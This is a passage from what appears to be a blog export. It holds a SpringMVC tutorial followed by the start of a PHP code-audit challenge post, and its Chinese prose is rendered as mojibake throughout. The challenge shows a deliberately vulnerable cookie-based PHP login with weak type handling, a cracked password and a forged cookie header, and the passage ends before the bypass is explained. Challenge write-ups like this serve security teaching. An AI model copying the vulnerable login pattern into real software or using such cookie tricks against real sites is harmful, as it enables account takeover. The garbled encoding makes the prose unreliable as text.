ä¸€ä¸ª@RequestMappingå³å¯å®ç°ï¼Œå…¶å®ä»å®ƒçš„åå­—æˆ‘ä»¬ä¹Ÿèƒ½å¾—çŸ¥ï¼Œæ­¤æ³¨è§£å°±æ˜¯å°†è¯·æ±‚å’Œå¤„ç†è¯·æ±‚çš„æ–¹æ³•å»ºç«‹ä¸€ä¸ªæ˜ å°„å…³ç³»ï¼Œå½“æ”¶åˆ°è¯·æ±‚æ—¶å°±å¯ä»¥æ ¹æ®æ˜ å°„å…³ç³»è°ƒç”¨å¯¹åº”çš„è¯·æ±‚å¤„ç†æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ¥å…ˆèŠèŠ@RequestMappingå§ï¼Œæ³¨è§£å®šä¹‰å¦‚ä¸‹ 1234567891011121314151617181920@Mappingpublic @interface RequestMapping &#123; String name() default &quot;&quot;; @AliasFor(&quot;path&quot;) String[] value() default &#123;&#125;; @AliasFor(&quot;value&quot;) String[] path() default &#123;&#125;; RequestMethod[] method() default &#123;&#125;; String[] params() default &#123;&#125;; String[] headers() default &#123;&#125;; String[] consumes() default &#123;&#125;; String[] produces() default &#123;&#125;;&#125; å…¶ä¸­æœ€å…³é”®çš„æ˜¯pathå±æ€§ï¼ˆç­‰ä»·äºvalueï¼‰ï¼Œå®ƒå†³å®šäº†å½“å‰æ–¹æ³•å¤„ç†çš„è¯·æ±‚è·¯å¾„ï¼Œæ³¨æ„è·¯å¾„å¿…é¡»å…¨å±€å”¯ä¸€ï¼Œä»»ä½•è·¯å¾„åªèƒ½æœ‰ä¸€ä¸ªæ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤æ–¹æ³•ä¸ä»…ä»…å¯ä»¥åªç”¨äºå¤„ç†æŸä¸€ä¸ªè¯·æ±‚è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•å¤„ç†å¤šä¸ªè¯·æ±‚è·¯å¾„ï¼š 1234@RequestMapping(&#123;&quot;/index&quot;, &quot;/test&quot;&#125;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; ç°åœ¨æˆ‘ä»¬è®¿é—®&#x2F;indexæˆ–æ˜¯&#x2F;testéƒ½ä¼šç»è¿‡æ­¤æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥å°†@RequestMappingæ·»åŠ åˆ°ç±»åä¸Šï¼Œè¡¨ç¤ºä¸ºæ­¤ç±»ä¸­çš„æ‰€æœ‰è¯·æ±‚æ˜ å°„æ·»åŠ ä¸€ä¸ªè·¯å¾„å‰ç¼€ï¼Œæ¯”å¦‚ï¼š 123456789@Controller@RequestMapping(&quot;/yyds&quot;)public class MainController &#123; @RequestMapping(&#123;&quot;/index&quot;, &quot;/test&quot;&#125;) public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;); &#125;&#125; é‚£ä¹ˆç°åœ¨æˆ‘ä»¬éœ€è¦è®¿é—®/yyds/indexæˆ–æ˜¯/yyds/testæ‰å¯ä»¥å¾—åˆ°æ­¤é¡µé¢ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨IDEAä¸‹æ–¹çš„ç«¯ç‚¹æ¿å—ä¸­æŸ¥çœ‹å½“å‰Webåº”ç”¨ç¨‹åºå®šä¹‰çš„æ‰€æœ‰è¯·æ±‚æ˜ å°„ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡IDEAä¸ºæˆ‘ä»¬æä¾›çš„å†…ç½®Webå®¢æˆ·ç«¯ç›´æ¥è®¿é—®æŸä¸ªè·¯å¾„ã€‚ è·¯å¾„è¿˜æ”¯æŒä½¿ç”¨é€šé…ç¬¦è¿›è¡ŒåŒ¹é…ï¼š ?ï¼šè¡¨ç¤ºä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚@RequestMapping(&quot;/index/x?&quot;)å¯ä»¥åŒ¹é…&#x2F;index&#x2F;xaã€&#x2F;index&#x2F;xbç­‰ç­‰ã€‚ *ï¼šè¡¨ç¤ºä»»æ„0-nä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚@RequestMapping(&quot;/index/*&quot;)å¯ä»¥åŒ¹é…&#x2F;index&#x2F;lbwnbã€&#x2F;index&#x2F;yydsç­‰ã€‚ **ï¼šè¡¨ç¤ºå½“å‰ç›®å½•æˆ–åŸºäºå½“å‰ç›®å½•çš„å¤šçº§ç›®å½•ï¼Œæ¯”å¦‚@RequestMapping(&quot;/index/**&quot;)å¯ä»¥åŒ¹é…&#x2F;indexã€&#x2F;index&#x2F;xxxç­‰ã€‚ æˆ‘ä»¬æ¥ç€æ¥çœ‹ä¸‹ä¸€ä¸ªmethodå±æ€§ï¼Œé¡¾åæ€ä¹‰ï¼Œå®ƒå°±æ˜¯è¯·æ±‚çš„æ–¹æ³•ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥é™å®šè¯·æ±‚æ–¹å¼ï¼Œæ¯”å¦‚ï¼š 1234@RequestMapping(value = &quot;/index&quot;, method = RequestMethod.POST)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; ç°åœ¨æˆ‘ä»¬å¦‚æœç›´æ¥ä½¿ç”¨æµè§ˆå™¨è®¿é—®æ­¤é¡µé¢ï¼Œä¼šæ˜¾ç¤º405æ–¹æ³•ä¸æ”¯æŒï¼Œå› ä¸ºæµè§ˆå™¨é»˜è®¤æ˜¯ç›´æ¥ä½¿ç”¨GETæ–¹æ³•è·å–é¡µé¢ï¼Œè€Œæˆ‘ä»¬è¿™é‡ŒæŒ‡å®šä¸ºPOSTæ–¹æ³•è®¿é—®æ­¤åœ°å€ï¼Œæ‰€ä»¥è®¿é—®å¤±è´¥ï¼Œæˆ‘ä»¬ç°åœ¨å†å»ç«¯ç‚¹ä¸­ç”¨POSTæ–¹å¼å»è®¿é—®ï¼ŒæˆåŠŸå¾—åˆ°é¡µé¢ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨è¡ç”Ÿæ³¨è§£ç›´æ¥è®¾å®šä¸ºæŒ‡å®šç±»å‹çš„è¯·æ±‚æ˜ å°„ï¼š 1234@PostMapping(value = &quot;/index&quot;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; è¿™é‡Œä½¿ç”¨äº†@PostMappingç›´æ¥æŒ‡å®šä¸ºPOSTè¯·æ±‚ç±»å‹çš„è¯·æ±‚æ˜ å°„ï¼ŒåŒæ ·çš„ï¼Œè¿˜æœ‰@GetMappingå¯ä»¥ç›´æ¥æŒ‡å®šä¸ºGETè¯·æ±‚æ–¹å¼ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨paramså±æ€§æ¥æŒ‡å®šè¯·æ±‚å¿…é¡»æºå¸¦å“ªäº›è¯·æ±‚å‚æ•°ï¼Œæ¯”å¦‚ï¼š 1234@RequestMapping(value = &quot;/index&quot;, params = &#123;&quot;username&quot;, &quot;password&quot;&#125;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; æ¯”å¦‚è¿™é‡Œæˆ‘ä»¬è¦æ±‚è¯·æ±‚ä¸­å¿…é¡»æºå¸¦usernameå’Œpasswordå±æ€§ï¼Œå¦åˆ™æ— æ³•è®¿é—®ã€‚å®ƒè¿˜æ”¯æŒè¡¨è¾¾å¼ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥è¿™æ ·ç¼–å†™ï¼š 1234@RequestMapping(value = &quot;/index&quot;, params = &#123;&quot;!username&quot;, &quot;password&quot;&#125;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; åœ¨usernameä¹‹å‰æ·»åŠ ä¸€ä¸ªæ„Ÿå¹å·è¡¨ç¤ºè¯·æ±‚çš„ä¸å…è®¸æºå¸¦æ­¤å‚æ•°ï¼Œå¦åˆ™æ— æ³•è®¿é—®ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥ç›´æ¥è®¾å®šä¸€ä¸ªå›ºå®šå€¼ï¼š 1234@RequestMapping(value = &quot;/index&quot;, params = &#123;&quot;username!=test&quot;, &quot;password=123&quot;&#125;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; è¿™æ ·ï¼Œè¯·æ±‚å‚æ•°usernameä¸å…è®¸ä¸ºtestï¼Œå¹¶ä¸”passwordå¿…é¡»ä¸º123ï¼Œå¦åˆ™æ— æ³•è®¿é—®ã€‚ headerå±æ€§ç”¨æ³•ä¸paramsä¸€è‡´ï¼Œä½†æ˜¯å®ƒè¦æ±‚çš„æ˜¯è¯·æ±‚å¤´ä¸­éœ€è¦æºå¸¦ä»€ä¹ˆå†…å®¹ï¼Œæ¯”å¦‚ï¼š 1234@RequestMapping(value = &quot;/index&quot;, headers = &quot;!Connection&quot;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; é‚£ä¹ˆï¼Œå¦‚æœè¯·æ±‚å¤´ä¸­æºå¸¦äº†Connectionå±æ€§ï¼Œå°†æ— æ³•è®¿é—®ã€‚å…¶ä»–ä¸¤ä¸ªå±æ€§ï¼š consumesï¼š æŒ‡å®šå¤„ç†è¯·æ±‚çš„æäº¤å†…å®¹ç±»å‹ï¼ˆContent-Typeï¼‰ï¼Œä¾‹å¦‚application&#x2F;json, text&#x2F;html; produces: æŒ‡å®šè¿”å›çš„å†…å®¹ç±»å‹ï¼Œä»…å½“requestè¯·æ±‚å¤´ä¸­çš„(Accept)ç±»å‹ä¸­åŒ…å«è¯¥æŒ‡å®šç±»å‹æ‰è¿”å›ï¼› @RequestParamå’Œ@RequestHeaderè¯¦è§£æˆ‘ä»¬æ¥ç€æ¥çœ‹ï¼Œå¦‚ä½•è·å–åˆ°è¯·æ±‚ä¸­çš„å‚æ•°ã€‚ æˆ‘ä»¬åªéœ€è¦ä¸ºæ–¹æ³•æ·»åŠ ä¸€ä¸ªå½¢å¼å‚æ•°ï¼Œå¹¶åœ¨å½¢å¼å‚æ•°å‰é¢æ·»åŠ @RequestParamæ³¨è§£å³å¯ï¼š 12345@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(@RequestParam(&quot;username&quot;) String username)&#123; System.out.println(&quot;æ¥å—åˆ°è¯·æ±‚å‚æ•°ï¼š&quot;+username); return new ModelAndView(&quot;index&quot;);&#125; æˆ‘ä»¬éœ€è¦åœ¨@RequestParamä¸­å¡«å†™å‚æ•°åç§°ï¼Œå‚æ•°çš„å€¼ä¼šè‡ªåŠ¨ä¼ é€’ç»™å½¢å¼å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨æ–¹æ³•ä¸­ä½¿ç”¨ï¼Œæ³¨æ„ï¼Œå¦‚æœå‚æ•°åç§°ä¸å½¢å¼å‚æ•°åç§°ç›¸åŒï¼Œå³ä½¿ä¸æ·»åŠ @RequestParamä¹Ÿèƒ½è·å–åˆ°å‚æ•°å€¼ã€‚ ä¸€æ—¦æ·»åŠ @RequestParamï¼Œé‚£ä¹ˆæ­¤è¯·æ±‚å¿…é¡»æºå¸¦æŒ‡å®šå‚æ•°ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†requireå±æ€§è®¾å®šä¸ºfalseæ¥å°†å±æ€§è®¾å®šä¸ºéå¿…é¡»ï¼š 12345@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(@RequestParam(value = &quot;username&quot;, required = false) String username)&#123; System.out.println(&quot;æ¥å—åˆ°è¯·æ±‚å‚æ•°ï¼š&quot;+username); return new ModelAndView(&quot;index&quot;);&#125; æˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥è®¾å®šä¸€ä¸ªé»˜è®¤å€¼ï¼Œå½“è¯·æ±‚å‚æ•°ç¼ºå¤±æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨é»˜è®¤å€¼ï¼š 12345@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(@RequestParam(value = &quot;username&quot;, required = false, defaultValue = &quot;ä¼å…µä¸€å·&quot;) String username)&#123; System.out.println(&quot;æ¥å—åˆ°è¯·æ±‚å‚æ•°ï¼š&quot;+username); return new ModelAndView(&quot;index&quot;);&#125; å¦‚æœéœ€è¦ä½¿ç”¨ServletåŸæœ¬çš„ä¸€äº›ç±»ï¼Œæ¯”å¦‚ï¼š 12345@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(HttpServletRequest request)&#123; System.out.println(&quot;æ¥å—åˆ°è¯·æ±‚å‚æ•°ï¼š&quot;+request.getParameterMap().keySet()); return new ModelAndView(&quot;index&quot;);&#125; ç›´æ¥æ·»åŠ HttpServletRequestä¸ºå½¢å¼å‚æ•°å³å¯ï¼ŒSpringMVCä¼šè‡ªåŠ¨ä¼ é€’è¯¥è¯·æ±‚åŸæœ¬çš„HttpServletRequestå¯¹è±¡ï¼ŒåŒç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ·»åŠ HttpServletResponseä½œä¸ºå½¢å¼å‚æ•°ï¼Œç”šè‡³å¯ä»¥ç›´æ¥å°†HttpSessionä¹Ÿä½œä¸ºå‚æ•°ä¼ é€’ï¼š 123456@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(HttpSession session)&#123; System.out.println(session.getAttribute(&quot;test&quot;)); session.setAttribute(&quot;test&quot;, &quot;é¸¡ä½ å¤ªç¾&quot;); return new ModelAndView(&quot;index&quot;);&#125; æˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥å°†è¯·æ±‚å‚æ•°ä¼ é€’ç»™ä¸€ä¸ªå®ä½“ç±»ï¼š 12345@Datapublic class User &#123; String username; String password;&#125; æ³¨æ„å¿…é¡»æºå¸¦setæ–¹æ³•æˆ–æ˜¯æ„é€ æ–¹æ³•ä¸­åŒ…å«æ‰€æœ‰å‚æ•°ï¼Œè¯·æ±‚å‚æ•°ä¼šè‡ªåŠ¨æ ¹æ®ç±»ä¸­çš„å­—æ®µåç§°è¿›è¡ŒåŒ¹é…ï¼š 12345@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(User user)&#123; System.out.println(&quot;è·å–åˆ°cookieå€¼ä¸ºï¼š&quot;+user); return new ModelAndView(&quot;index&quot;);&#125; @RequestHeaderä¸@RequestParamç”¨æ³•ä¸€è‡´ï¼Œä¸è¿‡å®ƒæ˜¯ç”¨äºè·å–è¯·æ±‚å¤´å‚æ•°çš„ï¼Œè¿™é‡Œå°±ä¸å†æ¼”ç¤ºäº†ã€‚ @CookieValueå’Œ@SessionAttrbutieé€šè¿‡ä½¿ç”¨@CookieValueæ³¨è§£ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å¿«é€Ÿè·å–è¯·æ±‚æºå¸¦çš„Cookieä¿¡æ¯ï¼š 12345678 @RequestMapping(&quot;/cookie&quot;) //ç›´æ¥å¡«å†™è®¿é—®è·¯å¾„// @RequestMapping(value = &quot;/index&quot;) public ModelAndView index(HttpServletResponse response, @CookieValue(value = &quot;test&quot;,required = false) String test)&#123; ModelAndView modelAndView = new ModelAndView(&quot;index&quot;); response.addCookie(new Cookie(&quot;test&quot;,&quot;lbwnb&quot;)); System.out.println(&quot;è·å–åˆ°cookieå€¼ä¸ºï¼š&quot;+test); return modelAndView; &#125; åŒæ ·çš„ï¼ŒSessionä¹Ÿèƒ½ä½¿ç”¨æ³¨è§£å¿«é€Ÿè·å–ï¼š 12345678910@RequestMapping(&quot;/session&quot;)public ModelAndView session(@SessionAttribute(value=&quot;test&quot;,required = false) String test, HttpSession session)&#123; session.setAttribute(&quot;test&quot;,&quot;admin&quot;); System.out.println(test); String username = (String) session.getAttribute(&quot;test&quot;); System.out.println(&quot;Session ä¸­çš„ç”¨æˆ·åï¼š&quot; + username); return new ModelAndView(&quot;index&quot;);&#125; å¯ä»¥å‘ç°ï¼Œé€šè¿‡ä½¿ç”¨SpringMVCæ¡†æ¶ï¼Œæ•´ä¸ªWebåº”ç”¨ç¨‹åºçš„å¼€å‘å˜å¾—éå¸¸ç®€å•ï¼Œå¤§éƒ¨åˆ†åŠŸèƒ½åªéœ€è¦ä¸€ä¸ªæ³¨è§£å°±å¯ä»¥æå®šäº†ï¼Œæ­£æ˜¯å¾—ç›ŠäºSpringæ¡†æ¶ï¼ŒSpringMVCæ‰èƒ½å¤§æ˜¾èº«æ‰‹ã€‚ é‡å®šå‘å’Œè¯·æ±‚è½¬å‘é‡å®šå‘å’Œè¯·æ±‚è½¬å‘ä¹Ÿéå¸¸ç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è§†å›¾åç§°å‰é¢æ·»åŠ ä¸€ä¸ªå‰ç¼€å³å¯ï¼Œæ¯”å¦‚é‡å®šå‘ï¼š 1234@GetMapping(&quot;/redirect&quot;)public String redirect()&#123; return &quot;redirect:/test/cookie&quot;;&#125; é€šè¿‡æ·»åŠ redirect:å‰ç¼€ï¼Œå°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å®ç°é‡å®šå‘ï¼Œé‚£ä¹ˆè¯·æ±‚è½¬å‘å‘¢ï¼Œå…¶å®ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä½¿ç”¨forward:å‰ç¼€è¡¨ç¤ºè½¬å‘ç»™å…¶ä»–è¯·æ±‚æ˜ å°„ï¼š 1234@GetMapping(&quot;forward&quot;)public String forward()&#123; return &quot;forward:/test/cookie&quot;;&#125; ä½¿ç”¨SpringMVCï¼Œåªéœ€è¦ä¸€ä¸ªå‰ç¼€å°±å¯ä»¥å®ç°é‡å®šå‘å’Œè¯·æ±‚è½¬å‘ï¼Œéå¸¸æ–¹ä¾¿ã€‚ RestFulé£æ ¼ä¸­æ–‡é‡Šä¹‰ä¸ºâ€œè¡¨ç°å±‚çŠ¶æ€è½¬æ¢â€ï¼ˆåå­—æŒºé«˜å¤§ä¸Šçš„ï¼‰ï¼Œå®ƒä¸æ˜¯ä¸€ç§æ ‡å‡†ï¼Œè€Œæ˜¯ä¸€ç§è®¾è®¡é£æ ¼ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å……åˆ†å¹¶æ­£ç¡®åˆ©ç”¨HTTPåè®®çš„ç‰¹æ€§ï¼Œè§„èŒƒèµ„æºè·å–çš„URIè·¯å¾„ã€‚é€šä¿—çš„è®²ï¼ŒRESTfulé£æ ¼çš„è®¾è®¡å…è®¸å°†å‚æ•°é€šè¿‡URLæ‹¼æ¥ä¼ åˆ°æœåŠ¡ç«¯ï¼Œç›®çš„æ˜¯è®©URLçœ‹èµ·æ¥æ›´ç®€æ´å®ç”¨ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å……åˆ†ä½¿ç”¨å¤šç§HTTPè¯·æ±‚æ–¹å¼ï¼ˆPOST&#x2F;GET&#x2F;PUT&#x2F;DELETEï¼‰ï¼Œæ¥æ‰§è¡Œç›¸åŒè¯·æ±‚åœ°å€çš„ä¸åŒç±»å‹æ“ä½œã€‚ å› æ­¤ï¼Œè¿™ç§é£æ ¼çš„è¿æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä»è¯·æ±‚è·¯å¾„ä¸­è¯»å–å‚æ•°ï¼Œæ¯”å¦‚ï¼š 1http://localhost:8080/mvc/index/123456 æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†indexçš„ä¸‹ä¸€çº§è·¯å¾„ä½œä¸ºè¯·æ±‚å‚æ•°è¿›è¡Œå¤„ç†ï¼Œä¹Ÿå°±æ˜¯è¯´ç°åœ¨çš„è¯·æ±‚å‚æ•°åŒ…å«åœ¨äº†è¯·æ±‚è·¯å¾„ä¸­,æ³¨æ„è¯·æ±‚è·¯å¾„æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æ·»åŠ ç±»ä¼¼å ä½ç¬¦ä¸€æ ·çš„ä¿¡æ¯ï¼Œè¿™æ ·å ä½ç¬¦ä½ç½®çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«ä½œä¸ºè¯·æ±‚å‚æ•°ï¼Œè€Œæ–¹æ³•çš„å½¢å‚åˆ—è¡¨ä¸­å¿…é¡»åŒ…æ‹¬ä¸€ä¸ªä¸å ä½ç¬¦åŒåçš„å¹¶ä¸”æ·»åŠ äº†@PathVariableæ³¨è§£çš„å‚æ•°ï¼Œæˆ–æ˜¯ç”±@PathVariableæ³¨è§£æŒ‡å®šä¸ºå ä½ç¬¦åç§°ï¼š 12345@GetMapping(&quot;/restful/&#123;str&#125;&quot;) public String restful(@PathVariable String str)&#123; System.out.println(str); return &quot;index&quot;; &#125; å¦‚æœæ²¡æœ‰é…ç½®æ­£ç¡®ï¼Œæ–¹æ³•åç§°ä¸Šä¼šå‡ºç°é»„çº¿ã€‚ æˆ‘ä»¬å¯ä»¥æŒ‰ç…§ä¸åŒåŠŸèƒ½è¿›è¡Œåˆ’åˆ†ï¼š POST http://localhost:8080/mvc/index - æ·»åŠ ç”¨æˆ·ä¿¡æ¯ï¼Œæºå¸¦è¡¨å•æ•°æ® GET http://localhost:8080/mvc/index/{id} - è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œidç›´æ¥æ”¾åœ¨è¯·æ±‚è·¯å¾„ä¸­ PUT http://localhost:8080/mvc/index - ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œæºå¸¦è¡¨å•æ•°æ® DELETE http://localhost:8080/mvc/index/{id} - åˆ é™¤ç”¨æˆ·ä¿¡æ¯ï¼Œidç›´æ¥æ”¾åœ¨è¯·æ±‚è·¯å¾„ä¸­ æˆ‘ä»¬åˆ†åˆ«ç¼–å†™å››ä¸ªè¯·æ±‚æ˜ å°„ï¼š 123456789101112131415161718192021222324252627@Controllerpublic class MainController &#123; @RequestMapping(value = &quot;/index/&#123;id&#125;&quot;, method = RequestMethod.GET) public String get(@PathVariable(&quot;id&quot;) String text)&#123; System.out.println(&quot;è·å–ç”¨æˆ·ï¼š&quot;+text); return &quot;index&quot;; &#125; @RequestMapping(value = &quot;/index&quot;, method = RequestMethod.POST) public String post(String username)&#123; System.out.println(&quot;æ·»åŠ ç”¨æˆ·ï¼š&quot;+username); return &quot;index&quot;; &#125; @RequestMapping(value = &quot;/index/&#123;id&#125;&quot;, method = RequestMethod.DELETE) public String delete(@PathVariable(&quot;id&quot;) String text)&#123; System.out.println(&quot;åˆ é™¤ç”¨æˆ·ï¼š&quot;+text); return &quot;index&quot;; &#125; @RequestMapping(value = &quot;/index&quot;, method = RequestMethod.PUT) public String put(String username)&#123; System.out.println(&quot;ä¿®æ”¹ç”¨æˆ·ï¼š&quot;+username); return &quot;index&quot;; &#125;&#125; Interceptoræ‹¦æˆªå™¨æ‹¦æˆªå™¨æ˜¯æ•´ä¸ªSpringMVCçš„ä¸€ä¸ªé‡è¦å†…å®¹ï¼Œæ‹¦æˆªå™¨ä¸è¿‡æ»¤å™¨ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”¨äºæ‹¦æˆªä¸€äº›éæ³•è¯·æ±‚ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹‹å‰è®²è§£çš„è¿‡æ»¤å™¨æ˜¯ä½œç”¨äºServletä¹‹å‰ï¼Œåªæœ‰ç»è¿‡å±‚å±‚çš„è¿‡æ»¤å™¨æ‰å¯ä»¥æˆåŠŸåˆ°è¾¾Servletï¼Œè€Œæ‹¦æˆªå™¨å¹¶ä¸æ˜¯åœ¨Servletä¹‹å‰ï¼Œå®ƒåœ¨Servletä¸RequestMappingä¹‹é—´ï¼Œç›¸å½“äºDispatcherServletåœ¨å°†è¯·æ±‚äº¤ç»™å¯¹åº”Controllerä¸­çš„æ–¹æ³•ä¹‹å‰è¿›è¡Œæ‹¦æˆªå¤„ç†ï¼Œå®ƒåªä¼šæ‹¦æˆªæ‰€æœ‰Controllerä¸­å®šä¹‰çš„è¯·æ±‚æ˜ å°„å¯¹åº”çš„è¯·æ±‚ï¼ˆä¸ä¼šæ‹¦æˆªé™æ€èµ„æºï¼‰ï¼Œè¿™é‡Œä¸€å®šè¦åŒºåˆ†ä¸¤è€…çš„ä¸åŒã€‚ åˆ›å»ºæ‹¦æˆªå™¨åˆ›å»ºä¸€ä¸ªæ‹¦æˆªå™¨æˆ‘ä»¬éœ€è¦å®ç°ä¸€ä¸ªHandlerInterceptoræ¥å£ï¼š 123456789101112131415161718public class MainInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; System.out.println(&quot;æˆ‘æ˜¯å¤„ç†ä¹‹å‰ï¼&quot;); return true; //åªæœ‰è¿”å›trueæ‰ä¼šç»§ç»­ï¼Œå¦åˆ™ç›´æ¥ç»“æŸ &#125; @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123; System.out.println(&quot;æˆ‘æ˜¯å¤„ç†ä¹‹åï¼&quot;); &#125; @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123; //åœ¨DispatcherServletå®Œå…¨å¤„ç†å®Œè¯·æ±‚åè¢«è°ƒç”¨ System.out.println(&quot;æˆ‘æ˜¯å®Œæˆä¹‹åï¼&quot;); &#125;&#125; æ¥ç€æˆ‘ä»¬éœ€è¦åœ¨é…ç½®ç±»ä¸­è¿›è¡Œæ³¨å†Œï¼š 123456@Overridepublic void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(new MainInterceptor()) .addPathPatterns(&quot;/**&quot;) //æ·»åŠ æ‹¦æˆªå™¨çš„åŒ¹é…è·¯å¾„ï¼Œåªè¦åŒ¹é…ä¸€å¾‹æ‹¦æˆª .excludePathPatterns(&quot;/home&quot;); //æ‹¦æˆªå™¨ä¸è¿›è¡Œæ‹¦æˆªçš„è·¯å¾„&#125; ç°åœ¨æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®indexé¡µé¢ï¼Œæ‹¦æˆªå™¨å·²ç»ç”Ÿæ•ˆã€‚ å¾—åˆ°æ•´ç†æ‹¦æˆªå™¨çš„æ‰§è¡Œé¡ºåºï¼š 1234æˆ‘æ˜¯å¤„ç†ä¹‹å‰ï¼æˆ‘æ˜¯å¤„ç†ï¼æˆ‘æ˜¯å¤„ç†ä¹‹åï¼æˆ‘æ˜¯å®Œæˆä¹‹åï¼","tags":["java å¼€å‘"],"categories":["å¼€å‘"]},{"title":"php ä»£ç å®¡è®¡","path":"/2024/09/09/php/ä»£ç å®¡è®¡å°é¢˜ç›®/","content":"æ”¶é›†ä¸€äº› php çš„å¥‡æŠ€æ·«å·§ï¼Œæ¥è‡ªäº p ç¥çŸ¥è¯†æ˜Ÿçƒå’Œ github ä¸Šçš„ä¸€äº›é¶åœº 0x0001ç¯å¢ƒï¼šPHP5.4.30 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php$users = array( &quot;0:9b5c3d2b64b8f74e56edec71462bd97a&quot; , &quot;1:4eb5fb1501102508a86971773849d266&quot;, &quot;2:facabd94d57fc9f1e655ef9ce891e86e&quot;, &quot;3:ce3924f011fe323df3a6a95222b0c909&quot;, &quot;4:7f6618422e6a7ca2e939bd83abde402c&quot;, &quot;5:06e2b745f3124f7d670f78eabaa94809&quot;, &quot;6:8e39a6e40900bb0824a8e150c0d0d59f&quot;, &quot;7:d035e1a80bbb377ce1edce42728849f2&quot;, &quot;8:0927d64a71a9d0078c274fc5f4f10821&quot;, &quot;9:e2e23d64a642ee82c7a270c6c76df142&quot;, &quot;10:70298593dd7ada576aff61b6750b9118&quot;);$valid_user = false;$input = $_COOKIE[&#x27;user&#x27;];$input[1] = md5($input[1]);foreach ($users as $user)&#123; $user = explode(&quot;:&quot;, $user); if ($input === $user) &#123; $uid = $input[0] + 0; $valid_user = true; &#125;&#125;if (!$valid_user) &#123; die(&quot;not a valid user &quot;);&#125;if ($uid == 0) &#123; echo &quot;Hello Admin How can I serve you today? &quot;; echo &quot;SECRETS .... &quot;;&#125; else &#123; echo &quot;Welcome back user &quot;;&#125; ç”¨æˆ·5çš„å¯†ç Hash06e2b745f3124f7d670f78eabaa94809ï¼Œå¯†ç æ˜æ–‡æ˜¯hundï¼Œåœ¨å¾·è¯­ä¸­æ˜¯ç‹—çš„æ„æ€ã€‚ æˆ‘ä»¬ç°åœ¨çŸ¥é“ä»COOKIEä¸­è·å–æ•°æ®ï¼Œä½œä¸ºæ•°ç»„è¿›è¡Œå‚¨å­˜ã€‚æ•°ç»„åŒ…å«ä¸¤ä¸ªå…ƒç´ ï¼šç”¨æˆ·IDå’Œå¯†ç æ˜æ–‡ã€‚è¿˜çŸ¥é“ç”¨æˆ·5çš„å¯†ç æ˜æ–‡æ˜¯hundã€‚è¿™æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®cookieä»¥ç”¨æˆ·5çš„èº«ä»½è¿›è¡Œç™»å½•ã€‚ 1Cookie:user[0]=5;user[1]=hund; ä½†æ˜¯èµ°åˆ° $input === $user å,å°†cookieä¸­çš„$uidåŠ ä¸Š0æ¥å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—ç±»å‹ã€‚æ­¤å¤–ï¼Œè¿˜å°†$valid_userè®¾ä¸ºtrue æ‰€ä»¥ $uid æ­¤æ—¶å°±ç­‰äº 5 ã€‚ 